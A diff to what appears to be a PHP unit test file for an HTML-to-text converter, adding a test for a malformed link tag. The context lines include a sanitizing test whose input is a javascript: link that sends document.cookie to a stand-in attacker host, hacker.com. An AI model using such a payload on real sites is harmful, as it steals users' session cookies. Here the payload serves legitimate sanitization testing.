@@ -254,6 +254,16 @@ Link text [/]';
     self::assertSame($expected, $html2text->getText());
   }
 
+  public function testBrokenLink()
+  {
+    $html = '<ahref="#">Broken Link text</a>';
+    $expected = 'Broken Link text';
+
+    $html2text = new Html2Text($html, array('do_links' => 'inline'));
+
+    self::assertSame($expected, $html2text->getText());
+  }
+
   public function testJavascriptSanitizing()
   {
     $html = '<a href="javascript:window.open(\'http://hacker.com?cookie=\'+document.cookie)">Link text</a>';
